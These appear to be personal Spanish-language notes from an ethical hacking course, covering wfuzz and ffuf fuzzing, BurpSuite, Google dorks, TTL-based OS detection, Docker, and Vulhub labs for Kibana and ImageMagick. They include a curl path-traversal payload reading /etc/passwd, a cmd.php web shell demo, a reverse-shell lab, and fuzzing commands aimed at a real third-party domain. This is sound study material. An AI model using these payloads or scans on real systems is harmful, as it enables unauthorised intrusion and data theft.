- **Informes personalizables**: La herramienta permite generar informes detallados y personalizados sobre las pruebas de penetración y los resultados obtenidos.
- **Interfaz de usuario intuitiva**: La interfaz de BurpSuite Professional es fácil de utilizar y permite a los profesionales de seguridad trabajar de manera eficiente.
- **Herramientas avanzadas**: Incluye funcionalidades avanzadas, como el módulo de intrusión, el rastreador de vulnerabilidades y el generador de payloads, que facilitan la identificación y explotación de vulnerabilidades en aplicaciones web.

En conclusión, tanto la Community Edition como la versión Professional de BurpSuite ofrecen un conjunto de herramientas útiles y eficientes para realizar pruebas de penetración en aplicaciones web. Sin embargo, la versión Professional brinda ventajas adicionales.

La elección entre ambas versiones dependerá del alcance y las necesidades específicas del proyecto o de la empresa. Si se requiere un conjunto básico de herramientas para pruebas de seguridad ocasionales, la Community Edition podría ser suficiente. No obstante, si se busca una solución más completa y personalizable, con soporte técnico y herramientas avanzadas para un enfoque profesional y exhaustivo, la versión Professional sería la opción más adecuada.


fIltrar por longitud-> -sl (show line) o -hc (hide line). Con palabras o caracteres lo mismo pero -> -hw (hide words) -sw (show words) // -hh (hide chars) -sh (show chars)
```
❯ wfuzz -c -L --sl=100 --hc=404,403 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://deriv.com/FUZZ
```

![[Pasted image 20240721004429.png]]

Hay varios tipos de payloads, por ejemplo tipo diccionario (-z file,/...) = -w
Pero si quisieramos buscar .html,.php,.txt por ejemplo:
```
 wfuzz -c -L --hc=404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-txt-php https://deriv.com/FUZZ.FUZ2Z
```
Si hubiese un tercer diccionario por ente -> FUZ3Z

Este ejemplo es para testear productos de carrito de compra (concepto de range para englobar rango):
![[Pasted image 20240721010330.png]]

*fuff* -> es como wfuzz pero en go (no en python) -> https://github.com/ffuf/ffuf
```
git clone https://github.com/ffuf/ffuf  
go build -ldflags "-s -w" .
❯ du -hc ffuf
7,9M	ffuf
7,9M	total
❯ upx fuff
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: fuff: FileNotFoundException: fuff: No such file or directory

Packed 0 files.
❯ ./ffuf
```

```
❯ ./ffuf -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://deriv.com/FUZZ/ --mc=200
```

Normalmente utilizaremos wfuzz o gobuster, pero si la web fuese muy lento y hay congestión le dariamos con fuff.

*Phonebook.cz* -> de forma pasiva para subdominios
![[Pasted image 20240721012631.png]]


*Burpsuite* -> Trabaja como un intermediario
```
❯ burpsuite &> /dev/null & disown
```

![[Pasted image 20240721183918.png]]

Por defecto escucha desde el equipo local en el 8080:
![[Pasted image 20240721183940.png]]


Configuraremos el proxy-foxy:
![[Pasted image 20240721184531.png]]

Para dar permiso al navegador que se intercepten peticiones:
![[Pasted image 20240721184726.png]]

![[Pasted image 20240721184743.png]]

-> Save
![[Pasted image 20240721184816.png]]

![[Pasted image 20240721184924.png]]

![[Pasted image 20240721185008.png]]

![[Pasted image 20240721185036.png]]

![[Pasted image 20240721185100.png]]

![[Pasted image 20240721185138.png]]

![[Pasted image 20240721185308.png]]

![[Pasted image 20240721185428.png]]


*----------------------------------------------------------------------*
**# Google Dorks / Google Hacking (Los 18 Dorks más usados)**
*----------------------------------------------------------------------*
El ‘**Google Dork**‘ es una técnica de búsqueda avanzada que utiliza operadores y palabras clave específicas en el buscador de Google para encontrar información que normalmente no aparece en los resultados de búsqueda regulares.

La técnica de ‘**Google Dorking**‘ se utiliza a menudo en el hacking para encontrar información sensible y crítica en línea. Es una forma eficaz de recopilar información valiosa de una organización o individuo que puede ser utilizada para realizar pruebas de penetración y otros fines de seguridad.

Al utilizar Google Dorks, un atacante puede buscar información como nombres de usuarios y contraseñas, archivos confidenciales, información de bases de datos, números de tarjetas de crédito y otra información crítica. También pueden utilizar esta técnica para identificar vulnerabilidades en aplicaciones web, sitios web y otros sistemas en línea.

Es importante tener en cuenta que la técnica de Google Dorking **no es ilegal en sí misma**, pero puede ser utilizada con fines maliciosos. Por lo tanto, es crucial utilizar esta técnica con responsabilidad y ética en el contexto de la seguridad informática y el hacking ético.

Forzando a resultados con solo el dominio tinder.com
![[Pasted image 20240721185828.png]]

Solo mostrar dominio y recursos de tipo txt (pdf, excel,word, etc)
![[Pasted image 20240721185921.png]]

Mostrar que en el texto de entrada contenga tinder.com y sean archivos .pdf
![[Pasted image 20240721190043.png]]
Nos descargamos un pdf:
![[Pasted image 20240721190444.png]]
Extraemos metadatos del pdf:
![[Pasted image 20240721190611.png]]

https://pentest-tools.com

![[Pasted image 20240721191857.png]]

Mostrar páginas que contengan algo con tinder.com:
![[Pasted image 20240721192152.png]]


*Exploits de vulnerabilidades* -> sobre todo web
https://www.exploit-db.com/

![[Pasted image 20240721192403.png]]

Desde consola-> searchexploits

Ejemplo de busqueda google dork por vulnerabilidad
![[Pasted image 20240721192543.png]]


*-------------------------------------------------------------------------------*
*# Identificación y verificación externa de la versión del sistema operativo*
*-------------------------------------------------------------------------------*
El tiempo de vida (**TTL**) hace referencia a la cantidad de tiempo o “**saltos**” que se ha establecido que un paquete debe existir dentro de una red antes de ser descartado por un enrutador. El TTL también se utiliza en otros contextos, como el almacenamiento en caché de CDN y el almacenamiento en caché de DNS.

Cuando se crea un paquete de información y se envía a través de Internet, está el riesgo de que siga pasando de enrutador a enrutador indefinidamente. Para mitigar esta posibilidad, los paquetes se diseñan con una caducidad denominada **tiempo de vida** o **límite de saltos**. El TTL de los paquetes también puede ser útil para determinar cuánto tiempo ha estado en circulación un paquete determinado, y permite que el remitente pueda recibir información sobre la trayectoria de un paquete a través de Internet.

Cada paquete tiene un lugar en el que se almacena un valor numérico que determina cuánto tiempo debe seguir moviéndose por la red. Cada vez que un enrutador recibe un paquete, resta uno al recuento de TTL y lo pasa al siguiente lugar de la red. Si en algún momento el recuento de TTL llega a cero después de la resta, el enrutador descartará el paquete y enviará un mensaje ICMP al host de origen.

¿Qué tiene que ver esto con la identificación del sistema operativo? Bueno, resulta que diferentes sistemas operativos tienen diferentes valores predeterminados de TTL. Por ejemplo, en sistemas operativos Windows, el valor predeterminado de TTL es 128, mientras que en sistemas operativos Linux es 64.

Por lo tanto, si enviamos un paquete a una máquina y recibimos una respuesta que tiene un valor TTL de **128**, es probable que la máquina esté ejecutando **Windows**. Si recibimos una respuesta con un valor TTL de **64**, es más probable que la máquina esté ejecutando **Linux**.

Este método **no es infalible** y puede ser engañado por los administradores de red, pero puede ser útil en ciertas situaciones para identificar el sistema operativo de una máquina.

A continuación, se os comparte la página que mostramos en esta clase para identificar el sistema operativo correspondiente a los diferentes valores de TTL existentes.

- **Subin’s Blog**: [https://subinsb.com/default-device-ttl-values/](https://subinsb.com/default-device-ttl-values/)

Asimismo, os compartimos el script de Python encargado de identificar el sistema operativo en función del TTL obtenido:

- **WhichSystem**: [https://pastebin.com/HmBcu7j2](https://pastebin.com/HmBcu7j2)

Para reconocimiento de redes se puede utilizar este parámetro de nmap, pero es muy agresivo y tiene mucha tralla por detrás:
```
❯ nmap -O 192.168.1.1
```

El script whichSystem guardar en /usr/bin y darle privilegios de ejecución
```
❯ which whichSystem.py
/usr/bin/whichSystem.py
❯ chmod +x whichSystem.py
❯ whichSystem.py 192.168.1.1

192.168.1.1 (ttl -> 64): Linux
```



*--------------------------*
**Introducción a Docker**
*--------------------------*
**Docker** es una plataforma de **contenedores** de software que permite crear, distribuir y ejecutar aplicaciones en entornos aislados. Esto significa que se pueden empaquetar las aplicaciones con todas sus dependencias y configuraciones en un contenedor que se puede mover fácilmente de una máquina a otra, independientemente de la configuración del sistema operativo o del hardware.

Algunas de las ventajas que se presentan a la hora de practicar hacking usando Docker son:

- **Aislamiento**: los contenedores de Docker están aislados entre sí, lo que significa que si una aplicación dentro de un contenedor es comprometida, el resto del sistema no se verá afectado.
- **Portabilidad**: los contenedores de Docker se pueden mover fácilmente de un sistema a otro, lo que los hace ideales para desplegar entornos vulnerables para prácticas de hacking.
- **Reproducibilidad**: los contenedores de Docker se pueden configurar de forma precisa y reproducible, lo que es importante en el hacking para poder recrear escenarios de ataque.

En las próximas clases, se mostrará cómo instalar Docker, cómo crear y administrar contenedores, y cómo usar Docker para desplegar entornos vulnerables para practicar hacking.


*-----------------------------------*
**Instalación de Docker en Linux**
*-----------------------------------*
Para instalar **Docker** en Linux, se puede utilizar el comando “**apt install docker.io**“, que instalará el paquete Docker desde el repositorio de paquetes del sistema operativo. Es importante mencionar que, dependiendo de la distribución de Linux que se esté utilizando, el comando puede variar. Por ejemplo, en algunas distribuciones como CentOS o RHEL se utiliza “**yum install docker**” en lugar de “**apt install docker.io**“.

Una vez que Docker ha sido instalado, es necesario iniciar el **demonio** de Docker para que los contenedores puedan ser creados y administrados. Para iniciar el demonio de Docker, se puede utilizar el comando “**service docker start**“. Este comando iniciará el servicio del demonio de Docker, que es responsable de gestionar los contenedores y asegurarse de que funcionen correctamente.

```
❯ apt-get update
❯ apt install docker.io -y
❯ service docker start
❯ which docker
/usr/bin/docker
❯ docker images
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
❯ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```


*-------------------------------------------------*
**Definiendo estructura básica de Dockerfile**
*-------------------------------------------------*
Un archivo **Dockerfile** se compone de varias secciones, cada una de las cuales comienza con una **palabra clave** en **mayúsculas**, seguida de uno o más argumentos.

Algunas de las secciones más comunes en un archivo Dockerfile son:

- **FROM**: se utiliza para especificar la imagen base desde la cual se construirá la nueva imagen.
- **RUN**: se utiliza para ejecutar comandos en el interior del contenedor, como la instalación de paquetes o la configuración del entorno.
- **COPY**: se utiliza para copiar archivos desde el sistema host al interior del contenedor.
- **CMD**: se utiliza para especificar el comando que se ejecutará cuando se arranque el contenedor.

Además de estas secciones, también se pueden incluir otras instrucciones para configurar el entorno, instalar paquetes adicionales, exponer puertos de red y más.

En esta clase, se mostrará cómo crear un archivo Dockerfile desde cero, además de ver cómo utilizar las diferentes secciones y palabras clave para configurar la imagen. En la siguiente clase, veremos cómo construir y ejecutar un contenedor a partir de la imagen creada.

Dockerfile->imagen de docker (latest la última versión de ubuntu)
![[Pasted image 20240911181414.png]]

*------------------------------------------*
**Creación y construcción de imágenes**
*------------------------------------------*
Para crear una imagen de Docker, es necesario tener un archivo **Dockerfile** que defina la configuración de la imagen. Una vez que se tiene el Dockerfile, se puede utilizar el comando “**docker build**” para construir la imagen. Este comando buscará el archivo ‘Dockerfile’ en el directorio actual y utilizará las instrucciones definidas en el mismo para construir la imagen.

Algunas de las instrucciones que vemos en esta clase son:

- **docker build**: es el comando que se utiliza para construir una imagen de Docker a partir de un Dockerfile.

La sintaxis básica es la siguiente:

➜ `docker build [opciones] ruta_al_Dockerfile`

El parámetro “**-t**” se utiliza para etiquetar la imagen con un nombre y una etiqueta. Por ejemplo, si se desea etiquetar la imagen con el nombre “**mi_imagen**” y la etiqueta “**v1**“, se puede usar la siguiente sintaxis:

➜ `docker build -t mi_imagen:v1 ruta_al_Dockerfile`

El punto (“**.**“) al final de la ruta al Dockerfile se utiliza para indicar al comando que busque el Dockerfile en el directorio actual. Si el Dockerfile no se encuentra en el directorio actual, se puede especificar la ruta completa al Dockerfile en su lugar. Por ejemplo, si el Dockerfile se encuentra en “**/home/usuario/proyecto/**“, se puede usar la siguiente sintaxis:

➜ `docker build -t mi_imagen:v1 /home/usuario/proyecto/`

- **docker pull**: es el comando que se utiliza para descargar una imagen de Docker desde un registro de imágenes.

La sintaxis básica es la siguiente:

➜ `docker pull nombre_de_la_imagen:etiqueta`

Por ejemplo, si se desea descargar la imagen “ubuntu” con la etiqueta “latest”, se puede usar la siguiente sintaxis:

➜ `docker pull ubuntu:latest`

- **docker images**: es el comando que se utiliza para listar las imágenes de Docker que están disponibles en el sistema.

La sintaxis básica es la siguiente:

➜ `docker images [opciones]`

Durante la construcción de la imagen, Docker descargará y almacenará en caché las capas de la imagen que se han construido previamente, lo que hace que las compilaciones posteriores sean más rápidas.

-> Para levantar una imagen de docker:
![[Pasted image 20240911181644.png]]
Cada vez que se modifique la configuración del docker habrá que lanzar el comando de arriba.

![[Pasted image 20240911181959.png]]

Hay algunas distros que están preparadas por defaulta para descargar la imagen:
![[Pasted image 20240911182158.png]]
![[Pasted image 20240911182244.png]]


*---------------------------------------------------------------------------------------*
**Carga de instrucciones en Docker y desplegando nuestro primer contenedor**
*---------------------------------------------------------------------------------------*
Ya habiendo construido en la clase anterior nuestra primera imagen, ¡ya estamos preparados para desplegar nuestros contenedores!

El comando “**docker run**” se utiliza para crear y arrancar un contenedor a partir de una imagen. Algunas de las opciones más comunes para el comando “docker run” son:

- “**-d**” o “**–detach**“: se utiliza para arrancar el contenedor en segundo plano, en lugar de en primer plano.
- “**-i**” o “**–interactive**“: se utiliza para permitir la entrada interactiva al contenedor.
- “**-t**” o “**–tty**“: se utiliza para asignar un seudoterminal al contenedor.
- “**–name**“: se utiliza para asignar un nombre al contenedor.

Para arrancar un contenedor a partir de una imagen, se utiliza el siguiente comando:

➜ `docker run [opciones] nombre_de_la_imagen`

Por ejemplo, si se desea arrancar un contenedor a partir de la imagen “**mi_imagen**“, en segundo plano y con un seudoterminal asignado, se puede utilizar la siguiente sintaxis:

➜  `docker run -dit mi_imagen`

Una vez que el contenedor está en ejecución, se puede utilizar el comando “**docker ps**” para listar los contenedores que están en ejecución en el sistema. Algunas de las opciones más comunes son:

- “**-a**” o “**–all**“: se utiliza para listar todos los contenedores, incluyendo los contenedores detenidos.
- “**-q**” o “**–quiet**“: se utiliza para mostrar sólo los identificadores numéricos de los contenedores.

Por ejemplo, si se desea listar todos los contenedores que están en ejecución en el sistema, se puede utilizar la siguiente sintaxis:

➜  `docker ps -a`

Para ejecutar comandos en un contenedor que ya está en ejecución, se utiliza el comando “**docker exec**” con diferentes opciones. Algunas de las opciones más comunes son:

- “**-i**” o “**–interactive**“: se utiliza para permitir la entrada interactiva al contenedor.
- “**-t**” o “**–tty**“: se utiliza para asignar un seudoterminal al contenedor.

Por ejemplo, si se desea ejecutar el comando “**bash**” en el contenedor con el identificador “**123456789**“, se puede utilizar la siguiente sintaxis:

➜ `docker exec -it 123456789 bash`


-> Para ver imágenes creadas:
![[Pasted image 20240912101351.png]]

-> Para correr una imagen:
![[Pasted image 20240912101554.png]]

-> Para ver imágenes que se están corriendo:
![[Pasted image 20240912101701.png]]

-> Para ejecutar una consola desde el docker que se esta corriendo:
![[Pasted image 20240912102308.png]]
Le he escrito algunos comando para ver la consola interactiva (De por serie está desnuda, lo básico)
![[Pasted image 20240912103227.png]]
Por lo que para instalar todos los paquetes que necesitamos debemos seguir los siguientes pasos:
![[Pasted image 20240912104819.png]]
![[Pasted image 20240912104914.png]]
![[Pasted image 20240912105016.png]]

-> Esta es la dirección que me asignan al gestor de Docker:
![[Pasted image 20240912103044.png]]
-> Si hago ping desde la máquina local a la máquina remota:
![[Pasted image 20240912102807.png]]
Hay respuesta, está okay.

-> Desde la máquina remota podríamos hacer:
![[Pasted image 20240912105212.png]]
Hay respuesta.

*Para salir -> exit* -> seguiría el contenedor corriendo

-> Podríamos configurar el contenedor que hemos configurado al principio para que se instalen una serie de herramientas en vez de desplegarlas a pinrrel:
![[Pasted image 20240912110919.png]]
Recordar que habría que volver a crear la imagen:
![[Pasted image 20240912105801.png]]
Ya estaría creada la imagen versión 2:
![[Pasted image 20240912105956.png]]
Lo hacemos correr y ya estaría:
![[Pasted image 20240912111425.png]]
Al executar la consola desde el contenedor, tendriamos todas las herramientas instaladas:
![[Pasted image 20240912111731.png]]


*-------------------------------------------------------------*
**Comandos comunes para la gestión de contenedores**
*-------------------------------------------------------------*
- **docker rm $(docker ps -a -q) –force**: este comando se utiliza para eliminar todos los contenedores en el sistema, incluyendo los contenedores detenidos. La opción “**-q**” se utiliza para mostrar sólo los identificadores numéricos de los contenedores, y la opción “**–force**” se utiliza para forzar la eliminación de los contenedores que están en ejecución. Es importante tener en cuenta que la eliminación de todos los contenedores en el sistema puede ser peligrosa, ya que puede borrar accidentalmente contenedores importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.
- **docker rm id_contenedor**: este comando se utiliza para eliminar un contenedor específico a partir de su identificador. Es importante tener en cuenta que la eliminación de un contenedor eliminará también cualquier cambio que se haya realizado dentro del contenedor, como la instalación de paquetes o la modificación de archivos.
- **docker rmi $(docker images -q)**: este comando se utiliza para eliminar todas las imágenes de Docker en el sistema. La opción “**-q**” se utiliza para mostrar sólo los identificadores numéricos de las imágenes. Es importante tener en cuenta que la eliminación de todas las imágenes de Docker en el sistema puede ser peligrosa, ya que puede borrar accidentalmente imágenes importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.
- **docker rmi id_imagen**: este comando se utiliza para eliminar una imagen específica a partir de su identificador. Es importante tener en cuenta que la eliminación de una imagen eliminará también cualquier contenedor que se haya creado a partir de esa imagen. Si se desea eliminar una imagen que tiene contenedores en ejecución, se deben detener primero los contenedores y luego eliminar la imagen.

En la siguiente clase, veremos cómo aplicar port fowarding y cómo jugar con monturas. El **port forwarding** nos permitirá redirigir el tráfico de red desde un puerto específico en el host a un puerto específico en el contenedor, lo que nos permitirá acceder a los servicios que se ejecutan dentro del contenedor desde el exterior.

Las **monturas**, por otro lado, nos permitirán compartir un directorio o archivo entre el sistema host y el contenedor, lo que nos permitirá persistir la información entre ejecuciones de contenedores y compartir datos entre diferentes contenedores.

-> Para parar la ejecución de un contenedor:
![[Pasted image 20240912112345.png]]
Sin -a solo verías los que están corriendo, *para ver todos (corriendo y parado añadir la flag -a)*:
![[Pasted image 20240912112536.png]]

-> De esta otra forma harías una parada y borrado a la vez (pero solo se podría hacer una a una):
![[Pasted image 20240912113122.png]]
Como vemos no aparecería ni corriendo ni parado

-> Para borrar los contenedores pendientes (parados que queramos borrar):
![[Pasted image 20240912113337.png]]
Sacaremos el identificador, por lo que para borrar sería esta línea de comando:
![[Pasted image 20240912113534.png]]
![[Pasted image 20240912113600.png]]

-> Para borrar masivamente todos los contenedores o también las imágenes deberíamos hacer con el método anteriormente mencionado:
![[Pasted image 20240912113952.png]]
Tenemos tres contenedores corriendo
Los borramos con esta línea de comando:
![[Pasted image 20240912114217.png]]
Ya estarían borrados y no corren contenedores
![[Pasted image 20240912114312.png]]

-> Para borrar una imagen en particular (cuidado con que sean hijo de otras imagenes, etc. Habría que borrar secuencialmente):
![[Pasted image 20240912114506.png]]

->Inciso, el ejemplo anterior es de una imagen none . Esta imagenes también se podrían borrar de esta forma, todas a la vez:
![[Pasted image 20240912122120.png]]

-> Para borrar todas las imágenes:
![[Pasted image 20240912114813.png]]


*-----------------------------------------------------*
**Port Forwarding en Docker y uso de monturas**
*-----------------------------------------------------*
El **port forwarding**, también conocido como reenvío de puertos, nos permite **redirigir el tráfico de red** desde un puerto específico en el host a un puerto específico en el contenedor. Esto nos permitirá acceder a los servicios que se ejecutan dentro del contenedor desde el exterior.

Para utilizar el port forwarding, se utiliza la opción “**-p**” o “**–publish**” en el comando “**docker run**“. Esta opción se utiliza para especificar la redirección de puertos y se puede utilizar de varias maneras. Por ejemplo, si se desea redirigir el puerto 80 del host al puerto 8080 del contenedor, se puede utilizar la siguiente sintaxis:

➜ `docker run -p 80:8080 mi_imagen`

Esto redirigirá cualquier tráfico entrante en el puerto 80 del host al puerto 8080 del contenedor. Si se desea especificar un protocolo diferente al protocolo TCP predeterminado, se puede utilizar la opción “**-p**” con un formato diferente. Por ejemplo, si se desea redirigir el puerto 53 del host al puerto 53 del contenedor utilizando el protocolo UDP, se puede utilizar la siguiente sintaxis:

➜ `docker run -p 53:53/udp mi_imagen`

Las **monturas**, por otro lado, nos permiten compartir un directorio o archivo entre el sistema host y el contenedor. Esto nos permitirá persistir la información entre ejecuciones de contenedores y compartir datos entre diferentes contenedores.

Para utilizar las monturas, se utiliza la opción “**-v**” o “**–volume**” en el comando “**docker run**“. Esta opción se utiliza para especificar la montura y se puede utilizar de varias maneras. Por ejemplo, si se desea montar el directorio “**/home/usuario/datos**” del host en el directorio “**/datos**” del contenedor, se puede utilizar la siguiente sintaxis:

➜ `docker run -v /home/usuario/datos:/datos mi_imagen`

Esto montará el directorio “**/home/usuario/datos**” del host en el directorio “**/datos**” del contenedor. Si se desea especificar una opción adicional, como la de montar el directorio en modo de solo lectura, se puede utilizar la opción “**-v**” con un formato diferente. Por ejemplo, si se desea montar el directorio en modo de solo lectura, se puede utilizar la siguiente sintaxis:

➜ `docker run -v /home/usuario/datos:/datos:ro mi_imagen`

En la siguiente clase, veremos cómo desplegar máquinas vulnerables usando **Docker-Compose**.

Docker Compose es una herramienta de orquestación de contenedores que permite definir y ejecutar aplicaciones multi-contenedor de manera fácil y eficiente. Con Docker Compose, podemos describir los diferentes servicios que componen nuestra aplicación en un **archivo YAML** y, a continuación, utilizar un solo comando para ejecutar y gestionar todos estos servicios de manera coordinada.

En otras palabras, Docker Compose nos permite definir y configurar múltiples contenedores en un solo archivo YAML, lo que simplifica la gestión y la coordinación de múltiples contenedores en una sola aplicación. Esto es especialmente útil para aplicaciones complejas que requieren la interacción de varios servicios diferentes, ya que Docker Compose permite definir y configurar fácilmente la conexión y la comunicación entre estos servicios.



*-> PORT FORWARDING*

Añadimos al Dockerfile, para crear la imagen del contenedor Docker:
![[Pasted image 20240912123000.png]]
Añadiremos apache2 y php. Además haremos que se inicie el servicio de apache2 y bin/bash consola de shell para que no se apague y se mantenga activa. Y expondremos el puerto 80, del contenedor (Muchas veces se recomienda levantar web en contenedor y exponerlo, mejor que servidor local) Y nointeractive para no entrar en conflicto con Docker.

![[Pasted image 20240912121532.png]]
![[Pasted image 20240912121823.png]]

Haremos corre la imagen y habilitaremos el puerto :80
![[Pasted image 20240912123924.png]]

Por medio del contenedor levantado da acceso a la maquina local, pero si alguién comprometiese la web solo podría romper el contenedor:
![[Pasted image 20240912164428.png]]
Para confirmar que solo pudiésemos comprometer el contenedor, ejecutamos una bash desde el contenedor:
![[Pasted image 20240912164822.png]]

Borramos el index.html y creamos un index.php:
![[Pasted image 20240912164923.png]]
![[Pasted image 20240912165040.png]]
![[Pasted image 20240912165111.png]]

Imaginemos que podemos colgar un archivo cmd.php:
![[Pasted image 20240912165336.png]]
![[Pasted image 20240912165533.png]]
![[Pasted image 20240912165733.png]]
![[Pasted image 20240912165815.png]]

![[Pasted image 20240912165918.png]]

Pero se puede ver por el ifconfig que no se compremetería a la maquina local ,sino al contenedor:
![[Pasted image 20240912170046.png]]



*-> MONTURAS*
Creamos un archivo para ver la persistencia y sincronización de datos del contenedor y local:
![[Pasted image 20240912171127.png]]
Desplegamos el contenedor con las rutas del local : contenedor que vamos a sincronizar:
![[Pasted image 20240912171431.png]]
Ya está desplegado:
![[Pasted image 20240912171510.png]]
Esto es lo que tenemos en local
![[Pasted image 20240912171706.png]]

Si ejecuto una bash desde el contenedor voy a poder ver los archivo "puenteados" desde el local:
![[Pasted image 20240912172014.png]]
![[Pasted image 20240912172222.png]]
Y desde la máquina local podríamos ver que también se cambia:
![[Pasted image 20240912172336.png]]



 *-> LLEVAR ARCHIVOS DEL LOCAL AL CONTENEDOR*
![[Pasted image 20240912173449.png]]

![[Pasted image 20240912173242.png]]
Tendremos que volver a crear imagen con los cambios:
![[Pasted image 20240912173630.png]]
Corremos el contenerdor:
![[Pasted image 20240912174127.png]]
![[Pasted image 20240912174137.png]]
También podemos ir viendo los logs (lo que se va aconteciendo):
![[Pasted image 20240912174346.png]]
Para ver a tiempo real:
![[Pasted image 20240912174456.png]]

![[Pasted image 20240912174600.png]]

Desde la ejecución de la bash por contenedor:
![[Pasted image 20240912174757.png]]


*-----------------------------------------------------------------------------------*
**Despliegue maquinas vulnerables por DOCKER-COMPOSE (1/2) - KIBANA**
*-----------------------------------------------------------------------------------*
**AVISO**: En caso de que veáis que no estáis pudiendo instalar ‘**nano**‘ o alguna utilidad en el contenedor, eliminad todo el contenido del archivo ‘**/etc/apt/sources.list**‘ existente en el CONTENEDOR y metedle esta línea:

- **deb http://archive.debian.org/debian/ jessie contrib main non-free**
    

Posteriormente, haced un ‘**apt update**‘ y probad a instalar nuevamente la herramienta que queráis, ya no os debería de dar problemas.

Si estáis enfrentando dificultades con el contenedor de Elasticsearch y notáis que el contenedor no se crea después de ejecutar ‘**docker-compose up -d**‘, intentad modificar un parámetro del sistema con el siguiente comando en la consola:

- **sudo sysctl -w vm.max_map_count=262144**‘.

Después de hacerlo, intentad de nuevo ejecutar ‘**docker-compose up -d**‘, se debería solucionar el problema.

A continuación, os proporcionamos el enlace al proyecto de Github que estamos usando para esta clase:

- **Vulhub**: [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)

Asimismo, por aquí os compartimos el enlace al recurso donde se nos ofrece el script en Javascript encargado de establecer la Reverse Shell:

- **NodeJS Reverse Shell**: [https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell)

**docker-compose ->**  El docker-compose cli puede utilizarse para gestionar una aplicación multicontenedor. También mueve muchas de las opciones que se introducen en el docker run cli en el archivo docker-compose.yml para facilitar su reutilización. Funciona como un front-end «script» en la parte superior de la misma api docker utilizado por docker, por lo que puede hacer todo lo que docker-compose hace con comandos docker y un montón de shell scripting


*kibana:*
![[Pasted image 20240912180951.png]]
*Elasticsearch* es un servidor de búsqueda basado en Lucene. Provee un motor de búsqueda de texto completo, distribuido y con capacidad de multitenencia con una interfaz web RESTful y con documentos JSON. Elasticsearch está desarrollado en Java y está publicado como código abierto bajo las condiciones de la licencia Apache
*Elastic Stack* consiste en un conjunto de productos de código abierto de Elastic que han sido diseñados para tomar datos de cualquier fuente, así como analizarlos y visualizarlos en tiempo real. También se conoce como Stack ELK, ya que estas siglas dan nombre al conjunto de los productos open source que integra (Elasticsearch, Logstash y Kibana). Más adelante, también se ha incorporado el producto Beats.

Buscamos en la pagina github/vulhub -> ctr+f (kibana):
![[Pasted image 20240912180911.png]]

Siguiendo en la web:
![[Pasted image 20240912181812.png]]
![[Pasted image 20240912182034.png]]

![[Pasted image 20240912182132.png]]


-> Para levantar el aplicativo de Kibana y poder jugar con el, el repositorio tendremos que clonarlo (pero *hay un montón de repositorios colgados y nosotros solo queremos el de kibana*):

*!ESTO YA NO FUNCIONA*

Esta es la dirección de la vulnerabilidad en especifico:
![[Pasted image 20240912182501.png]]
En nuestra máquina local lanzaremos este comando variando esto:
![[Pasted image 20240912182725.png]]


Para que no ocupe tanto y solo me descargue el último repo.
```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
```

Vamos al directorio que nos interesa:
![[Pasted image 20240916104429.png]]
![[Pasted image 20240916104638.png]]
Para desplegar estos dos contenedores kibana y elascticsearch:
![[Pasted image 20240916104811.png]]

Desplegando contenedores:
```bash
sysctl -w vm.max_map_count=262144
docker-compose up -d
```

Ya lo tendríamos:
![[Pasted image 20240916105520.png]]

![[Pasted image 20240916105850.png]]
![[Pasted image 20240916110024.png]]

Si volvemos al repositorio hay un vector de ataque (local file inclusion..):
![[Pasted image 20240916111052.png]]

```bash
curl -s -X GET "http://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
```

```bash
docker-compose logs
```
![[Pasted image 20240916112007.png]]

Ejecutando una consola interactiva de bahs:
```
docker-compose exec kibana bash
```
![[Pasted image 20240916112057.png]]

Podríamos crear un archivo malicioso:
![[Pasted image 20240916112215.png]]

Buscamos un script para nodejs para hacer ingeniería inversa:
![[Pasted image 20240916112619.png]]
![[Pasted image 20240916112657.png]]

Luego desde la consola interactiva de kibana:
![[Pasted image 20240916112936.png]]
![[Pasted image 20240916113028.png]]

**No sé que le pasa a la bash en kibana pero no puedo hacer el update**
Intentaremos por otras vías, crearemos el archivo reverse_shell.js en local y lo pasaremos a máquina remota:
En local:
![[Pasted image 20240916174045.png]]

En remoto:
![[Pasted image 20240916174353.png]]

Si me pongo desde el localhost en escucha con nc y hago un curl para descargarme archivo:
![[Pasted image 20240916180432.png]]
Para tener una pseudoconsola:
![[Pasted image 20240916180921.png]]

*También se podría haber creado el archivo .js con un echo*
```bash
echo -e "linea1\nlinea2\nlinea3" > archivo (editado)
```
 *o con un cat tambien:(Le dices a cat, redirige la salida a nuevo_archivo, hasta que te encuentres EOF)*
 ```bash
 cat > nuevo archivo >> EOF
linea1
linea2
linea3 
EOF
```


*--------------------------------------------------------------------------------------------*
**Despliegue maquinas vulnerables por DOCKER-COMPOSE (2/2) - IMAGEMAGICK**
*--------------------------------------------------------------------------------------------*
vulnerabilidad de **ImageMagick** (**ImageTragick**) que tocamos en esta clase:

- **Proyecto de Github**: [https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick](https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick)

**ImageMagick** es un conjunto de utilidades de [código abierto](https://es.wikipedia.org/wiki/C%C3%B3digo_abierto "Código abierto")[1](https://es.wikipedia.org/wiki/ImageMagick#cite_note-1)​ para mostrar, manipular y convertir imágenes, capaz de leer y escribir más de 200 formatos.[2](https://es.wikipedia.org/wiki/ImageMagick#cite_note-:0-2)​ ImageMagick es publicado bajo la [Licencia Apache](https://es.wikipedia.org/wiki/Licencia_Apache "Licencia Apache")
 ![[Pasted image 20240916182440.png]]

txt

```bash
docker-compose up -d
```
![[Pasted image 20240916183354.png]]

![[Pasted image 20240916183431.png]]

